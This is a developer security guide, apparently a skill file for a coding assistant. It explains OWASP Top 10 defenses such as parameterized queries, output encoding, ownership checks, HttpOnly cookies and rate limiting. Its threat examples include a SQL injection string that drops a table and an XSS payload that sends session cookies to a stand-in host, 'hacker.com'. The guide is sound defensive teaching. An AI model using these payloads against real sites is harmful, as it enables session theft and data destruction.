---
name: Security Basics (Developer)
description: The essential OWASP Top 10 defenses that every developer must apply to their daily code to prevent trivial exploits.
category: roles/dev
metadata:
  labels: [dev, security, owasp, xss, sqli, defense]
  triggers:
    priority: critical
    confidence: 0.95
    keywords: [security basics, prevent xss, prevent sql injection, owasp]
---

# 🛡️ Developer Security Basics

> **Use this skill when**: writing any code that accepts input from the physical internet (forms, URLs, APIs). Assume all input is malicious. Trigger: `/dev-sec-basics`.
>
> **Out of scope**: DevOps infrastructure security (e.g., AWS WAFs). This is strictly Application-layer source code defenses (OWASP Top 10).

---

## 🚫 Anti-Patterns

- **Trusting the Client**: Implementing price validation strictly in React JS, believing a user won't just curl the API directly with `{"price": -50.00}` to steal money.
- **Roll Your Own Crypto**: Writing a custom hashing function instead of using industry-standard `bcrypt` or `Argon2` for passwords.
- **String Concatenation SQL**: `SELECT * FROM users WHERE email = '` + req.body.email + `'`. (The ultimate suicide method for a database).

---

## 🛠 Prerequisites & Tooling

1. Familiarity with the OWASP Top 10.
2. A mature ORM/Query Builder (e.g., Prisma, Hibernate, SQLAlchemy) or standard parameterization libraries.

---

## 🔄 Execution Workflow

### Defense 1 — SQL Injection (SQLi)
*The Threat*: A user submits `'; DROP TABLE users;--` into the login box.
*The Fix*: NEVER concatenate strings to form SQL. Always use Prepared Statements or Parameterized Queries. The database driver must treat input strictly as a literal String value, never as executable code.

### Defense 2 — Cross-Site Scripting (XSS)
*The Threat*: A user sets their profile Name to `<script>document.location='http://hacker.com?cookie='+document.cookie</script>`, stealing sessions from anyone who views their profile.
*The Fix*: Sanitize/Escape input on the Backend, and Contextually Encode output on the Frontend. (Modern frameworks like React auto-escape `{variable}` interpolation, but NEVER use `dangerouslySetInnerHTML` without a strict HTML sanitizer like DOMPurify).

### Defense 3 — Insecure Direct Object Reference (IDOR)
*The Threat*: An authenticated user changes the URL from `GET /invoices/12` to `GET /invoices/13` and successfully downloads a different company's private invoice.
*The Fix*: Authentication != Authorization. You must verify ownership.
`SELECT * FROM invoices WHERE id = 13 AND user_id = {current_logged_in_user_id}`.

### Defense 4 — Broken Authentication / Session Fixation
*The Threat*: Storing session IDs in `localStorage` making them easily theft targets via XSS.
*The Fix*: Issue JWTs or Session IDs inside `HttpOnly, Secure, SameSite=Strict` cookies. Javascript cannot physically read an `HttpOnly` cookie.

### Defense 5 — Rate Limiting at the API Edge
*The Threat*: A bot loops a script attempting 50,000 passwords a second against your Login API (Credential Stuffing).
*The Fix*: Introduce a Redis-backed rate limiter on Authentication endpoints (e.g., Max 5 attempts per IP per 5 minutes).

---

## ⚠️ Error Handling (Fallback)

| Scenario | Condition | Fallback Action |
|----------|-----------|-----------------|
| Legacy Raw SQL | You inherit a 10-year-old codebase with 500 instances of concatenated SQL queries | You cannot fix all 500 in one PR. Introduce an explicit ESLint/SonarQube rule to **block any NEW instances of raw string queries**, and create a Jira Epic to refactor the old ones over the next 3 sprints. |

---

## ✅ Done Criteria / Verification

A feature is considered baseline-secure when:

- [ ] All database interactions explicitly utilize Parameterization/ORMs.
- [ ] Resource requests (GET/PUT/DELETE) explicitly verify that the requesting user owns/has permission to the specific Resource ID.
- [ ] User-submitted data reflecting back onto the screen is strictly passed through an escaping mechanism.
